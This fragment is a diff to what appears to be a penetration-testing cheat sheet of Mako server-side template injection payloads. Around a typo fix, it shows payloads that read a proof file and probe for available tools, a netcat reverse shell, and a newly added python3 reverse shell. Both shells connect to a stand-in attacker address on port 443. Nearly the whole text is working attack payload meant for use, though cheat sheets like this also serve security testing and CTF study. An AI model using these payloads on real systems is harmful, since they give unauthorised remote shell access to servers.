@@ -117,8 +117,12 @@ ${self.module.cache.util.os.popen("cat proof.txt").read()}
 ${self.module.cache.util.os.popen('which python3  which python  which perl  which nc  which busybox || which sh').read()}
 ```
 
-- Try reverse shell for netcat
+- Try reverse shell usung netcat
 ```
 ${self.module.cache.util.os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Kali_IP> 443 >/tmp/f")}
+```
+- Try reverse shell using python3
+```
+${self.module.cache.util.os.system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<Kali_IP>\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])' > /tmp/f")}
 ```
 ---
